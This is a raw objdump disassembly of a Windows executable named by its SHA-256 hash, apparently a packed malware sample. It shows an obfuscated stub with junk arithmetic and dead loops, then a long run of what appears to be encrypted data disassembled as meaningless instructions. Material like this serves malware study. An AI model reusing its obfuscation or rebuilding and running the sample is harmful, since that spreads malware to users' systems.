
c7cf457948433200b6980243c6e12179671a167c31d549d21ef9778b0464614e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a292,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a266,0x13
  401024:	cmp    DWORD PTR ds:0x42a266,0x0
  40102b:	je     0x401070
  401031:	cmp    DWORD PTR ds:0x42a266,0x23
  401038:	jg     0x401070
  40103e:	jmp    0x40105e
  401043:	push   0x1
  401045:	push   0x4b7c
  40104a:	push   DWORD PTR [ebp-0x28]
  40104d:	push   DWORD PTR [ebp-0x1c]
  401050:	push   0x4108
  401055:	push   DWORD PTR [ebp-0xc]
  401058:	call   DWORD PTR ds:0x42a3c2
  40105e:	mov    ecx,DWORD PTR ds:0x42a266
  401064:	dec    ecx
  401065:	mov    DWORD PTR ds:0x42a266,ecx
  40106b:	jmp    0x401024
  401070:	push   edi
  401071:	mov    esi,0x75108aa
  401076:	sbb    DWORD PTR ds:0x42a266,0x4c4b
  401080:	xor    eax,esi
  401082:	and    DWORD PTR ds:0x42a26e,0x59cd
  40108c:	mov    edi,0x3272f1
  401091:	mov    ecx,DWORD PTR ds:0x42a26a
  401097:	sbb    ecx,DWORD PTR ds:0x42a2aa
  40109d:	mov    DWORD PTR ds:0x42a26a,ecx
  4010a3:	add    eax,edi
  4010a5:	and    DWORD PTR ds:0x42a296,0x0
  4010af:	jmp    0x4010c3
  4010b4:	xor    ecx,ecx
  4010b6:	xor    ecx,DWORD PTR ds:0x42a296
  4010bc:	inc    ecx
  4010bd:	mov    DWORD PTR ds:0x42a296,ecx
  4010c3:	cmp    DWORD PTR ds:0x42a296,0x1e
  4010ca:	jae    0x401113
  4010d0:	cmp    DWORD PTR ds:0x42a296,0xe
  4010d7:	ja     0x401113
  4010dd:	jmp    0x4010f2
  4010e2:	push   0x42a25e
  4010e7:	push   0x42916d
  4010ec:	call   DWORD PTR ds:0x42a3ca
  4010f2:	cmp    DWORD PTR ds:0x42a296,0xd
  4010f9:	jne    0x40110e
  4010ff:	xor    ecx,ecx
  401101:	or     ecx,DWORD PTR ds:0x42a296
  401107:	inc    ecx
  401108:	mov    DWORD PTR ds:0x42a296,ecx
  40110e:	jmp    0x4010b4
  401113:	mov    DWORD PTR [ebp-0x40],eax
  401116:	mov    eax,ds:0x42a2ca
  40111b:	sbb    DWORD PTR ds:0x42a25a,eax
  401121:	mov    eax,ds:0x42929e
  401126:	sub    DWORD PTR ds:0x42a2fa,ecx
  40112c:	mov    eax,DWORD PTR [eax]
  40112e:	mov    DWORD PTR [ebp-0x3c],eax
  401131:	inc    eax
  401132:	mov    eax,ds:0x4294ae
  401137:	and    DWORD PTR ds:0x42a26a,0x0
  401141:	jmp    0x401153
  401146:	mov    ecx,DWORD PTR ds:0x42a26a
  40114c:	inc    ecx
  40114d:	mov    DWORD PTR ds:0x42a26a,ecx
  401153:	cmp    DWORD PTR ds:0x42a26a,0x1f
  40115a:	jae    0x40119f
  401160:	cmp    DWORD PTR ds:0x42a26a,0x4
  401167:	jge    0x40119f
  40116d:	jmp    0x401180
  401172:	push   DWORD PTR [ebp-0x18]
  401175:	push   0x42a2c6
  40117a:	call   DWORD PTR ds:0x42a3ce
  401180:	cmp    DWORD PTR ds:0x42a26a,0x3
  401187:	jne    0x40119a
  40118d:	mov    ecx,DWORD PTR ds:0x42a26a
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a26a,ecx
  40119a:	jmp    0x401146
  40119f:	mov    eax,DWORD PTR [eax]
  4011a1:	add    ecx,0x507d
  4011a7:	mov    DWORD PTR [ebp-0x1c],eax
  4011aa:	xor    ecx,0x7815
  4011b0:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  4011b7:	or     DWORD PTR ds:0x42a2da,0x4fa4
  4011c1:	mov    eax,DWORD PTR [ebp-0x34]
  4011c4:	xor    eax,esi
  4011c6:	sub    ecx,DWORD PTR ds:0x42a2ce
  4011cc:	add    eax,edi
  4011ce:	and    DWORD PTR ds:0x42a266,edi
  4011d4:	mov    DWORD PTR [ebp-0x40],eax
  4011d7:	mov    eax,ds:0x42941e
  4011dc:	mov    DWORD PTR [ebp-0x40],eax
  4011df:	xor    eax,0x2e62
  4011e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4011e7:	mov    DWORD PTR [ebp-0x14],eax
  4011ea:	and    DWORD PTR ds:0x42a2de,0x0
  4011f4:	xor    ecx,ecx
  4011f6:	xor    ecx,DWORD PTR ds:0x42a2de
  4011fc:	inc    ecx
  4011fd:	mov    DWORD PTR ds:0x42a2de,ecx
  401203:	cmp    DWORD PTR ds:0x42a2de,0xb
  40120a:	ja     0x401250
  401210:	jmp    0x401229
  401215:	push   DWORD PTR [ebp-0x14]
  401218:	push   0x42a25e
  40121d:	push   DWORD PTR [ebp-0x18]
  401220:	push   DWORD PTR [ebp-0x20]
  401223:	call   DWORD PTR ds:0x42a3d2
  401229:	cmp    DWORD PTR ds:0x42a2de,0xa
  401230:	jne    0x401243
  401236:	mov    ecx,DWORD PTR ds:0x42a2de
  40123c:	inc    ecx
  40123d:	mov    DWORD PTR ds:0x42a2de,ecx
  401243:	cmp    DWORD PTR ds:0x42a2de,0x12
  40124a:	jb     0x4011f4
  401250:	mov    eax,DWORD PTR [ebp-0x14]
  401253:	adc    DWORD PTR ds:0x42a2ee,edx
  401259:	push   0x4
  40125b:	pop    ecx
  40125c:	or     DWORD PTR ds:0x42a256,0x42a2ba
  401266:	sub    ecx,eax
  401268:	and    DWORD PTR ds:0x42a2ae,edx
  40126e:	add    ecx,DWORD PTR [ebp-0x1c]
  401271:	sub    DWORD PTR ds:0x42a25a,0x29a3
  40127b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401282:	adc    DWORD PTR ds:0x42a2ba,0x27f4
  40128c:	mov    DWORD PTR [ebp-0x18],ecx
  40128f:	xor    eax,eax
  401291:	xor    eax,DWORD PTR ds:0x42a2c2
  401297:	or     DWORD PTR ds:0x42a276,eax
  40129d:	jmp    0x4035f6
  4012a2:	scas   eax,DWORD PTR es:[edi]
  4012a3:	cdq    
  4012a4:	and    DWORD PTR [ebx],edx
  4012a6:	add    DWORD PTR [ebx+0x10ba9981],ecx
  4012ac:	cwde   
  4012ad:	int    0x52
  4012af:	loopne 0x40124a
  4012b1:	add    BYTE PTR [ebx+0x47838383],al
  4012b7:	pop    esi
  4012b8:	add    DWORD PTR [ebx+0x38262d24],0x20
  4012bf:	xor    al,0x22
  4012c1:	cs je  0x401301
  4012c4:	jo     0x40133d
  4012c6:	nop
  4012c7:	jo     0x40133c
  4012c9:	jae    0x401337
  4012cb:	dec    ebx
  4012cc:	aam    0xdd
  4012ce:	clc    
  4012cf:	imul   edx,DWORD PTR [ecx+0x72],0x79a96278
  4012d6:	ins    BYTE PTR es:[edi],dx
  4012d7:	pusha  
  4012d8:	into   
  4012d9:	pop    esp
  4012da:	push   ebx
  4012db:	cmp    DWORD PTR [ebp+0x66879603],ecx
  4012e1:	dec    esp
  4012e2:	jle    0x40132a
  4012e4:	mov    DWORD PTR [edi+0x42bbb97e],esi
  4012ea:	sub    eax,0x3dd77fe
  4012ef:	push   0x7e
  4012f1:	pop    ds
  4012f2:	in     al,dx
  4012f3:	inc    eax
  4012f4:	int3   
  4012f5:	ret    
  4012f6:	in     al,dx
  4012f7:	xchg   esi,eax
  4012f8:	sub    bl,bh
  4012fa:	xchg   edx,eax
  4012fb:	xor    BYTE PTR [esi],cl
  4012fd:	pusha  
  4012fe:	mov    dl,0x93
  401300:	aad    0x6
  401302:	ins    BYTE PTR es:[edi],dx
  401303:	fcom   QWORD PTR ds:0x37030fe5
  401309:	and    DWORD PTR [ecx+0xd],edx
  40130c:	aaa    
  40130d:	jb     0x401380
  40130f:	shr    BYTE PTR [esi-0x48eba7d6],0xfe
  401316:	lock push eax
  401318:	xor    al,BYTE PTR [ebp+0x62d14b]
  40131e:	and    eax,DWORD PTR [ebx]
  401320:	cmp    DWORD PTR [eax+0x5ea1dc7a],0x2516b892
  40132a:	fwait
  40132b:	dec    eax
  40132c:	or     bl,BYTE PTR [edi+0x128a8b3d]
  401332:	jecxz  0x401360
  401334:	imul   ecx,DWORD PTR [ebp+eax*2-0x31059ab6],0xffffff93
  40133c:	xor    BYTE PTR [eax-0x6e323937],dl
  401342:	push   0x4d6b54f5
  401347:	or     eax,0x1a470a3f
  40134c:	lods   al,BYTE PTR ds:[esi]
  40134d:	push   edx
  40134e:	shl    DWORD PTR [esi+0x6715d949],cl
  401354:	cld    
  401355:	imul   esp,DWORD PTR [edi-0x4c],0x0
  401359:	jno    0x401319
  40135b:	add    DWORD PTR [ebx+0x24],ebx
  40135e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40135f:	and    DWORD PTR [eax+0x76],ecx
  401362:	dec    esi
  401363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401364:	mov    eax,ds:0xfaa707ff
  401369:	mov    al,0xc4
  40136b:	adc    al,0x6d
  40136d:	xchg   ebp,eax
  40136e:	or     eax,edi
  401370:	ss movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  401373:	les    esi,FWORD PTR [ebx]
  401375:	xchg   ebx,eax
  401376:	push   0xffffffd5
  401378:	xchg   ebp,eax
  401379:	pop    esp
  40137a:	mov    ecx,0x7ffb6432
  40137f:	xchg   BYTE PTR [edx],ch
  401381:	cmp    esi,DWORD PTR [ecx-0x27]
  401384:	outs   dx,DWORD PTR ds:[esi]
  401385:	push   ebx
  401386:	mov    ecx,0x123f7aac
  40138b:	push   es
  40138c:	in     eax,dx
  40138d:	bound  edi,QWORD PTR [esi]
  40138f:	stos   BYTE PTR es:[edi],al
  401390:	xor    eax,0x9640e46d
  401395:	test   BYTE PTR [eax-0x518cc9c2],dl
  40139b:	xor    BYTE PTR [eax-0x68],bh
  40139e:	cmp    DWORD PTR [ebx-0x50],ebp
  4013a1:	inc    ebx
  4013a2:	add    ah,ch
  4013a4:	cs test al,0xb7
  4013a7:	cli    
  4013a8:	(bad)  
  4013a9:	sahf   
  4013aa:	cmc    
  4013ab:	lods   al,BYTE PTR ds:[esi]
  4013ac:	iret   
  4013ad:	xchg   esi,eax
  4013ae:	test   bl,0xb4
  4013b1:	mov    edx,0xde928af6
  4013b6:	mov    esp,0xb4b252a9
  4013bb:	scas   al,BYTE PTR es:[edi]
  4013bc:	int3   
  4013bd:	les    ebp,FWORD PTR [ecx]
  4013bf:	adc    al,0x1a
  4013c1:	add    DWORD PTR [esi],edx
  4013c3:	jle    0x4013de
  4013c5:	shl    DWORD PTR [ecx+edx*2-0x1ec63345],1
  4013cc:	dec    ebp
  4013cd:	sbb    al,0x30
  4013cf:	pop    edi
  4013d0:	xor    BYTE PTR [eax],0x9f
  4013d3:	dec    eax
  4013d4:	jo     0x401420
  4013d6:	xlat   BYTE PTR ds:[ebx]
  4013d7:	pop    ecx
  4013d8:	mov    edi,ebx
  4013da:	hlt    
  4013db:	sub    bh,dl
  4013dd:	pop    es
  4013de:	arpl   WORD PTR [eax+0x57],cx
  4013e1:	aaa    
  4013e2:	dec    ebp
  4013e3:	push   esi
  4013e4:	mov    eax,0x85ffae20
  4013e9:	gs leave 
  4013eb:	pop    ds
  4013ec:	stos   BYTE PTR es:[edi],al
  4013ed:	ret    0xfe59
  4013f0:	mov    ebx,DWORD PTR [edx]
  4013f2:	jbe    0x4013f1
  4013f4:	stos   DWORD PTR es:[edi],eax
  4013f5:	(bad)  
  4013f6:	fiadd  WORD PTR [esi]
  4013f8:	(bad)  
  4013f9:	fnstenv ds:0xa2db91c5
  4013ff:	xchg   edx,eax
  401400:	xchg   BYTE PTR [ecx+edi*4+0x71],ah
  401404:	mov    ebx,0xc663a5d3
  401409:	add    eax,DWORD PTR [ebx]
  40140b:	xor    al,0x7e
  40140d:	push   esi
  40140e:	sub    bh,dl
  401410:	xor    al,0x34
  401412:	ja     0x4013c2
  401414:	or     DWORD PTR [eax],edi
  401416:	pcmpeqd mm3,QWORD PTR [edx]
  401419:	inc    esi
  40141a:	ret    0xd2c8
  40141d:	cmp    al,0xd4
  40141f:	and    DWORD PTR [edx+0x55],eax
  401422:	in     al,dx
  401423:	jnp    0x4013c6
  401425:	xor    edx,DWORD PTR [ecx+0x4f68552e]
  40142b:	pop    ss
  40142c:	ret    
  40142d:	lds    edx,FWORD PTR [edx-0xe]
  401430:	mov    ds,edi
  401432:	arpl   WORD PTR [edi-0x20],bx
  401435:	mov    edi,edi
  401437:	xor    BYTE PTR [ecx+0xa],ch
  40143a:	je     0x4013ce
  40143c:	mov    esi,0x2ef6c368
  401441:	adc    eax,0x79d9ccb3
  401446:	inc    BYTE PTR [ebx+0x31]
  401449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40144a:	mov    BYTE PTR [edx+0x34c324e6],0x95
  401451:	xor    BYTE PTR [esi+0x40],dh
  401454:	call   0x720e7bf0
  401459:	or     esp,DWORD PTR [ecx-0x74b229b8]
  40145f:	ds enter 0x925b,0xc6
  401464:	jmp    FWORD PTR [edi+0xaa5475]
  40146a:	icebp  
  40146b:	mov    cl,0x50
  40146d:	test   BYTE PTR [edx+0x22],bh
  401470:	pusha  
  401471:	mov    bh,0x75
  401473:	fidiv  DWORD PTR [edx-0x18054afb]
  401479:	mov    cl,0xa0
  40147b:	pop    edx
  40147c:	inc    ecx
  40147d:	popa   
  40147e:	mov    bl,0x67
  401480:	out    0x38,al
  401482:	in     eax,0x83
  401484:	or     edx,esi
  401486:	inc    ebp
  401487:	lds    esp,FWORD PTR [eax]
  401489:	int    0x60
  40148b:	xchg   esi,eax
  40148c:	jbe    0x401451
  40148e:	jae    0x401465
  401490:	(bad)  
  401491:	jmp    0x4014df
  401493:	sahf   
  401494:	clc    
  401495:	in     al,0x32
  401497:	cdq    
  401498:	out    0x79,eax
  40149a:	fdivr  DWORD PTR [eax+0x2bed5614]
  4014a0:	or     BYTE PTR [ecx],dl
  4014a2:	int    0xa6
  4014a4:	inc    esi
  4014a5:	stc    
  4014a6:	and    DWORD PTR [ebx*1+0x6ed444a7],edi
  4014ad:	push   es
  4014ae:	sbb    eax,0xf7ebb169
  4014b3:	cmp    al,0xeb
  4014b5:	add    eax,0x39053670
  4014ba:	jge    0x401450
  4014bc:	fdivr  DWORD PTR [esi-0x66]
  4014bf:	inc    ebx
  4014c0:	out    dx,al
  4014c1:	fld    DWORD PTR [edx-0x7402460f]
  4014c7:	pop    esi
  4014c8:	iret   
  4014c9:	dec    ecx
  4014ca:	in     eax,dx
  4014cb:	sahf   
  4014cc:	iret   
  4014cd:	adc    eax,0x4667e00a
  4014d2:	xor    bl,BYTE PTR [edi]
  4014d4:	push   ss
  4014d5:	cmp    cl,BYTE PTR [ebx+0x63]
  4014d8:	xor    eax,0x133e93a0
  4014dd:	sbb    BYTE PTR [eax+0x29017522],0x4d
  4014e4:	cmp    bl,bh
  4014e6:	arpl   WORD PTR [ebp-0x6f],dx
  4014e9:	sub    al,0x54
  4014eb:	push   DWORD PTR [esp+edi*4]
  4014ee:	dec    eax
  4014ef:	aad    0xab
  4014f1:	mov    ah,0x2
  4014f3:	jp     0x40149e
  4014f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014f6:	stos   DWORD PTR es:[edi],eax
  4014f7:	mov    edi,0xf31a1c62
  4014fc:	call   FWORD PTR [eax]
  4014fe:	pusha  
  4014ff:	fcmovu st,st(2)
  401501:	stc    
  401502:	add    al,0x30
  401504:	cmp    al,0x31
  401506:	rcl    BYTE PTR [ecx-0x48e03f12],cl
  40150c:	sub    BYTE PTR [edi+edx*4+0x70317927],ah
  401513:	int3   
  401514:	stos   DWORD PTR es:[edi],eax
  401515:	mov    edi,0x156d302d
  40151a:	sti    
  40151b:	jmp    0x6eb326f6
  401520:	sbb    al,0x88
  401522:	pushf  
  401523:	aad    0x71
  401525:	jne    0x401535
  401527:	pop    ebx
  401528:	icebp  
  401529:	fnstenv ds:0x56a637ca
  40152f:	pop    ss
  401530:	fsubrp st(0),st
  401532:	lea    edi,[ebx]
  401534:	fs or  ah,ah
  401537:	leave  
  401538:	retf   0xb7ed
  40153b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40153c:	ins    BYTE PTR es:[edi],dx
  40153d:	push   eax
  40153e:	(bad)  
  401540:	xchg   DWORD PTR [eax],ecx
  401542:	in     eax,dx
  401543:	call   0xc51441b0
  401548:	imul   ebp,DWORD PTR [eax+ecx*2],0xffffff9e
  40154c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40154d:	fst    st(2)
  40154f:	call   0xa399:0xc71ffb72
  401556:	ret    
  401557:	xor    al,0xf7
  401559:	mov    ds:0xb8f91c28,eax
  40155e:	mov    ds:0x2d32a2ea,al
  401563:	dec    edx
  401564:	aaa    
  401565:	les    esi,FWORD PTR [ecx+esi*8-0x6f32ea87]
  40156c:	jbe    0x4015d2
  40156e:	push   esi
  40156f:	das    
  401570:	rol    BYTE PTR [ebp+0x66473749],1
  401576:	dec    edi
  401577:	leave  
  401578:	or     BYTE PTR [esi],bh
  40157a:	push   esp
  40157b:	arpl   si,bp
  40157d:	adc    dh,bh
  40157f:	add    al,0xfc
  401581:	pop    ds
  401582:	icebp  
  401583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401584:	xchg   ebx,eax
  401585:	mov    BYTE PTR [eax+0x63],al
  401588:	xchg   esi,eax
  401589:	(bad)  [ebp-0x12db0275]
  40158f:	stos   BYTE PTR es:[edi],al
  401590:	push   eax
  401591:	xchg   BYTE PTR [esi],dl
  401593:	clc    
  401594:	adc    dh,BYTE PTR [edi+ebp*2]
  401597:	fisubr DWORD PTR [esi-0x7b]
  40159a:	push   0xfffffffe
  40159c:	(bad)  
  40159d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40159e:	in     al,dx
  40159f:	inc    edi
  4015a0:	dec    eax
  4015a1:	pop    esp
  4015a2:	mov    ?,ebp
  4015a4:	das    
  4015a5:	pop    ds
  4015a6:	je     0x401558
  4015a8:	test   al,0x11
  4015aa:	jae    0x401595
  4015ac:	jo     0x4015e1
  4015ae:	pop    ss
  4015af:	ror    DWORD PTR [ecx-0x50c02d94],0x3f
  4015b6:	jnp    0x4015de
  4015b8:	pop    ecx
  4015b9:	push   ds
  4015ba:	jae    0x4015ca
  4015bc:	in     eax,dx
  4015bd:	les    ebx,FWORD PTR ds:0xadf420e2
  4015c3:	mov    ah,bl
  4015c5:	mov    ah,0x29
  4015c7:	mov    ch,0x34
  4015c9:	xchg   ch,cl
  4015cb:	jo     0x40157a
  4015cd:	xchg   BYTE PTR [edx+0x546bb565],al
  4015d3:	push   edx
  4015d4:	scas   al,BYTE PTR es:[edi]
  4015d5:	aas    
  4015d6:	jns    0x401626
  4015d8:	cmp    DWORD PTR [esi-0x4a],eax
  4015db:	popf   
  4015dc:	jns    0x401564
  4015de:	jae    0x4015a0
  4015e0:	sbb    al,0x4a
  4015e2:	and    BYTE PTR [edx+0x7db8cda1],ah
  4015e8:	or     BYTE PTR [edx-0x1019d93d],bh
  4015ee:	iret   
  4015ef:	lods   al,BYTE PTR ds:[esi]
  4015f0:	push   esi
  4015f1:	dec    edx
  4015f2:	stos   DWORD PTR es:[edi],eax
  4015f3:	les    edx,FWORD PTR [esi+0x67]
  4015f6:	xchg   esi,edi
  4015f8:	cld    
  4015f9:	pop    esp
  4015fa:	sahf   
  4015fb:	div    BYTE PTR [esi+0x598bfea2]
  401601:	dec    edi
  401602:	add    ch,BYTE PTR [eax]
  401604:	jbe    0x4015e9
  401606:	jmp    0xf754:0x636b234a
  40160d:	(bad)  
  40160e:	jae    0x401632
  401610:	add    al,0xb4
  401612:	sub    DWORD PTR [ebx+ebx*8+0x3d8a691a],ebp
  401619:	sbb    bl,BYTE PTR [edx]
  40161b:	jne    0x401604
  40161d:	sbb    BYTE PTR [ebp+0x6],bh
  401620:	mov    al,0x22
  401622:	add    dl,al
  401624:	ja     0x401655
  401626:	jmp    0xd2128b10
  40162b:	jns    0x401631
  40162d:	adc    BYTE PTR [edx],ch
  40162f:	or     al,0xcf
  401631:	jnp    0x4016a6
  401633:	test   al,0xa5
  401635:	lods   eax,DWORD PTR ds:[esi]
  401636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401637:	ret    
  401638:	adc    eax,0x2e26ae1c
  40163d:	scas   eax,DWORD PTR es:[edi]
  40163e:	lahf   
  40163f:	jbe    0x4015d3
  401641:	mov    WORD PTR [ebp+0x34f3a5e6],es
  401647:	into   
  401648:	push   edi
  401649:	sbb    ah,BYTE PTR [eax+edx*8-0x76]
  40164d:	jl     0x4015fc
  40164f:	dec    ebp
  401650:	sbb    BYTE PTR [ebx-0x230ea8b5],dl
  401656:	xchg   ebp,eax
  401657:	fsubr  DWORD PTR [esi+0x2dddeb8b]
  40165d:	mov    edx,0x636eebbf
  401662:	loopne 0x40162d
  401664:	or     eax,0xac9b88fa
  401669:	and    dl,BYTE PTR [ebp+eax*1-0x79]
  40166d:	cmp    DWORD PTR [eax],ecx
  40166f:	cmp    DWORD PTR [ebp+0x40],ebx
  401672:	outs   dx,DWORD PTR ds:[esi]
  401673:	loopne 0x401641
  401675:	fstp   TBYTE PTR [esi-0x10b613b0]
  40167b:	sysexit 
  40167d:	adc    BYTE PTR [ebx],ah
  40167f:	mov    BYTE PTR [esi],0xda
  401682:	add    dl,BYTE PTR [ebp+0x52]
  401685:	outs   dx,DWORD PTR ds:[esi]
  401686:	not    BYTE PTR [esi]
  401688:	push   cs
  401689:	pop    es
  40168a:	pop    edi
  40168b:	loope  0x4016fc
  40168d:	push   ebx
  40168e:	das    
  40168f:	jge    0x401618
  401691:	div    DWORD PTR [esi]
  401693:	pushf  
  401694:	je     0x4016d8
  401696:	hlt    
  401697:	lock ret 0x50da
  40169b:	mov    ebp,0x1ac9b8a0
  4016a0:	cmovge ecx,DWORD PTR [eax+0x28978315]
  4016a7:	popa   
  4016a8:	mov    bl,0xf8
  4016aa:	ror    esp,0x78
  4016ad:	add    al,0x21
  4016af:	inc    eax
  4016b0:	dec    bh
  4016b2:	cdq    
  4016b3:	cmc    
  4016b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016b5:	in     eax,0xc3
  4016b7:	out    0x7c,eax
  4016b9:	dec    ecx
  4016ba:	pop    esi
  4016bb:	mul    DWORD PTR cs:[ecx]
  4016be:	imul   BYTE PTR [eax-0x25]
  4016c1:	ret    0xc3de
  4016c4:	out    0x29,al
  4016c6:	and    eax,0xf63f70f9
  4016cb:	mov    ds,WORD PTR [ecx+0x7bcfc0da]
  4016d1:	stos   DWORD PTR es:[edi],eax
  4016d2:	sbb    ebx,DWORD PTR [eax+0x43]
  4016d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016d6:	cwde   
  4016d7:	jo     0x4016cb
  4016d9:	mov    ah,0xfa
  4016db:	retf   
  4016dc:	dec    edx
  4016dd:	or     al,0xa2
  4016df:	ds ss jae 0x4016d7
  4016e3:	mov    dh,0x6f
  4016e5:	inc    esp
  4016e6:	inc    edi
  4016e7:	and    bh,cl
  4016e9:	jp     0x40176a
  4016eb:	mov    dh,0x12
  4016ed:	jg     0x40171f
  4016ef:	xor    edi,DWORD PTR [eax+0x6b]
  4016f2:	adc    eax,0x5a76b348
  4016f7:	scas   al,BYTE PTR es:[edi]
  4016f8:	cld    
  4016f9:	mov    ah,0xcb
  4016fb:	sahf   
  4016fc:	fidiv  DWORD PTR [ebx-0x6c]
  4016ff:	test   al,0x7a
  401701:	sub    eax,0x4f12d5f8
  401706:	sbb    ecx,esi
  401708:	mov    dl,0x43
  40170a:	stos   BYTE PTR es:[edi],al
  40170b:	out    dx,al
  40170c:	aaa    
  40170d:	ds mov ebx,0x6207d659
  401713:	cmp    cl,BYTE PTR [edx-0x1e]
  401716:	xchg   esi,eax
  401717:	repnz inc edi
  401719:	xor    BYTE PTR es:[ebp+ebx*2-0x62],ah
  40171e:	fst    DWORD PTR [ebp+0x1e]
  401721:	loopne 0x401740
  401723:	(bad)  
  401724:	cld    
  401725:	(bad)  
  401727:	mov    ?,WORD PTR [edx]
  401729:	push   ebx
  40172a:	sti    
  40172b:	xchg   BYTE PTR [edi-0x35],dh
  40172e:	add    BYTE PTR [ebp+0x63bcfdf],dl
  401734:	push   esp
  401735:	pusha  
  401736:	fwait
  401737:	push   ds
  401738:	mov    ?,WORD PTR [eax]
  40173a:	cmp    BYTE PTR [ecx-0x29],al
  40173d:	dec    eax
  40173e:	pop    ebp
  40173f:	fdivr  DWORD PTR [edi]
  401741:	leave  
  401742:	sar    BYTE PTR [ecx+0x163e3b2a],cl
  401748:	mov    ch,0xcb
  40174a:	ins    BYTE PTR es:[edi],dx
  40174b:	push   0xffffffed
  40174d:	cmp    DWORD PTR [edi+0x64],ecx
  401750:	test   BYTE PTR [esi+0x3897777c],ch
  401756:	cmp    al,0xb5
  401758:	fnstsw WORD PTR [ebp-0xf24b292]
  40175e:	and    ch,ah
  401760:	scas   al,BYTE PTR es:[edi]
  401761:	mov    ah,BYTE PTR [edx+0x3a3ae7fb]
  401767:	outs   dx,BYTE PTR ds:[esi]
  401768:	fisub  DWORD PTR [bp+si-0x79]
  40176c:	test   al,0xec
  40176e:	or     DWORD PTR [ebp*1+0x409e3988],esi
  401775:	mov    esi,DWORD PTR [edx-0x63]
  401778:	cmp    BYTE PTR [esi-0x52f1af39],ch
  40177e:	pop    esi
  40177f:	ficom  WORD PTR [ecx+0x32]
  401782:	push   esp
  401783:	imul   esp,DWORD PTR es:[edi-0x12],0xffffffa2
  401788:	rcl    DWORD PTR [ebp+ecx*8-0x55],cl
  40178c:	sub    ecx,DWORD PTR [ecx]
  40178e:	and    eax,DWORD PTR [eax-0x4f]
  401791:	ja     0x401779
  401793:	shl    BYTE PTR [esi],0xac
  401796:	hlt    
  401797:	in     eax,0x46
  401799:	in     al,dx
  40179a:	pop    ebx
  40179b:	dec    edx
  40179c:	mov    edx,0xac8aa2e
  4017a1:	stos   DWORD PTR es:[edi],eax
  4017a2:	fbld   TBYTE PTR [esp+edi*1+0x49]
  4017a6:	xchg   esi,eax
  4017a7:	sbb    BYTE PTR [eax],dl
  4017a9:	gs push ds
  4017ab:	outs   dx,DWORD PTR ds:[esi]
  4017ac:	bound  esp,QWORD PTR [eax+0x5]
  4017af:	add    eax,0x521f7e5
  4017b4:	fisubr WORD PTR [ecx]
  4017b6:	loopne 0x40175f
  4017b8:	fcmovu st,st(7)
  4017ba:	or     BYTE PTR [edi],ch
  4017bc:	lea    eax,[eax-0x3cdfdded]
  4017c2:	push   ecx
  4017c3:	ror    DWORD PTR [ebx-0x1c],0x4f
  4017c7:	les    edi,FWORD PTR [edi-0x676523f3]
  4017cd:	mov    al,0x97
  4017cf:	outs   dx,DWORD PTR ds:[esi]
  4017d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017d1:	dec    esi
  4017d2:	cmp    al,BYTE PTR [eax]
  4017d4:	jbe    0x4017d0
  4017d6:	sbb    bl,BYTE PTR [eax+0x61]
  4017d9:	stos   BYTE PTR es:[edi],al
  4017da:	cmp    esi,DWORD PTR [esp+ebp*2]
  4017dd:	sbb    DWORD PTR ds:0xf75a56,esi
  4017e3:	arpl   dx,sp
  4017e5:	sub    dh,BYTE PTR [ecx+edi*1]
  4017e8:	fs jo  0x401793
  4017eb:	cwde   
  4017ec:	and    BYTE PTR [edx-0x60],cl
  4017ef:	push   edx
  4017f0:	dec    ecx
  4017f1:	into   
  4017f2:	mov    esp,DWORD PTR [eax]
  4017f4:	mov    ds:0x3d397803,eax
  4017f9:	jb     0x401840
  4017fb:	in     eax,dx
  4017fc:	test   DWORD PTR [edx-0x3ba0457d],0x2c44cda5
  401806:	jns    0x401868
  401808:	fwait
  401809:	rcr    eax,cl
  40180b:	push   ds
  40180c:	cwde   
  40180d:	loope  0x4017d3
  40180f:	(bad)  
  401810:	popf   
  401811:	and    DWORD PTR [edi+esi*1-0x583d105a],esi
  401818:	jae    0x401881
  40181a:	pusha  
  40181b:	cwde   
  40181c:	imul   edi,esi,0xfffffff7
  40181f:	jge    0x40183f
  401821:	and    al,0x94
  401823:	mov    esp,0xbcd37bca
  401828:	mov    ebx,gs
  40182a:	push   ebx
  40182b:	pop    ebx
  40182c:	cmp    DWORD PTR [edx],ecx
  40182e:	mov    bl,0xe3
  401830:	push   cs
  401831:	mov    esi,0x65b66a9e
  401836:	(bad)  
  401837:	and    ebx,DWORD PTR [ebx+ebp*8+0x22ffcf5e]
  40183e:	bound  eax,QWORD PTR [edi+0x3b]
  401841:	dec    eax
  401842:	mov    cl,0x0
  401844:	xchg   DWORD PTR [edx-0x4d6161e1],esp
  40184a:	hlt    
  40184b:	xchg   esp,eax
  40184c:	cmp    eax,0xaaaaaeb6
  401851:	and    eax,0xf67fddfa
  401856:	jle    0x40186e
  401858:	and    DWORD PTR [eax+0x729eb0d1],esp
  40185e:	pushaw 
  401860:	adc    DWORD PTR [ebp-0x3c],esi
  401863:	mov    WORD PTR [eax+ebx*1],fs
  401866:	(bad)  
  401867:	jo     0x4018e5
  401869:	(bad)  
  40186a:	enter  0xe32e,0x60
  40186e:	push   cs
  40186f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401870:	jecxz  0x40188d
  401872:	jecxz  0x4018d1
  401874:	cs or  dl,dl
  401877:	pusha  
